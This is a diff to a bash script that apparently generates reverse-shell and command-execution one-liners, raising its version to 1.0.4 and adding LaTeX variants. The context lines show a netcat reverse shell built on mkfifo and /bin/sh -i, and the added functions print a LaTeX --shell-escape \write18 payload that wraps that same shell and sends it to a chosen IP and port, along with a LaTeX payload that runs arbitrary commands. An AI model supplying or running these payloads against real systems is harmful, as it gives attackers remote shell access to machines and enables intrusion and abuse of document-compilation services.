@@ -24,7 +24,7 @@ printBanner()
  \___  / \___  /|__| /_______  /___|  /\___  /____/____/
 /_____/      \/              \/     \/     \/           
 
-	Version: 1.0.3 		Author: focab0r
+	Version: 1.0.4 		Author: focab0r
 '
 }
 
@@ -99,6 +99,12 @@ ncShell()
 	echo -e "${YELLOW}[2]${ENDCOLOR} rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${GREEN}$1${ENDCOLOR} ${PURPLE}$2${ENDCOLOR} >/tmp/f"
 }
 
+latexShell()
+{
+	echo -e "\n${BLUE}### Latex ###${ENDCOLOR}"
+	echo -e "${YELLOW}[1]${ENDCOLOR} latex --shell-escape '\documentclass{article}"'\\'"begin{document}\immediate\write18{rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${GREEN}$1${ENDCOLOR} ${PURPLE}$2${ENDCOLOR} >/tmp/f}"'\\'"end{document}'"
+}
+
 listShells()
 {
 	IPs=$1
@@ -110,6 +116,7 @@ listShells()
         rubyShell $IPs $PORTs
 	nodeShell $IPs $PORTs
 	ncShell $IPs $PORTs
+	latexShell $IPs $PORTs
 
 }
 
@@ -141,6 +148,13 @@ rubyCommand()
         echo -e "${YELLOW}[1]${ENDCOLOR} ruby -e 'exec \"${RED}$@${ENDCOLOR}\"'"
 }
 
+latexCommand()
+{
+        echo -e "\n${BLUE}### Latex ###${ENDCOLOR}"
+        echo -e "${YELLOW}[1]${ENDCOLOR} latex --shell-escape '\documentclass{article}"'\\'"begin{document}\immediate\write18{${RED}$@${ENDCOLOR}}"'\\'"end{document}'"
+
+}
+
 listCommands()
 {
 	COMMANDs=$@
@@ -148,6 +162,7 @@ listCommands()
 	pyCommand $COMMANDs
 	phpCommand $COMMANDs
 	rubyCommand $COMMANDs
+	latexCommand $COMMANDs
 }
 
 #### PROGRAM ####
